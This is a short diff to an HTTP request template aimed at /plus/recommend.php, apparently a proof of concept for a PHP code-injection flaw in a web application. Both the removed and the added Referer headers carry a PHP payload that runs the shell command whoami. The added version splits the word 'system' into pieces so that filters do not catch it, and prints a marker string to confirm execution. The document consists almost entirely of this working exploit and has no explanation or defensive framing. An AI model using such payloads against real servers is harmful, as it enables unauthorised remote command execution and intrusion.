@@ -1,5 +1,5 @@
 GET /plus/recommend.php HTTP/1.1
 Host: target
 User-Agent: Mozilla/5.0
-Referer: <?php "system"(whoami);die;/*
+Referer: <?php $a='syste';$b='m';$c=$a.$b;echo 'BGN-';$c('whoami');?>
 Connection: close
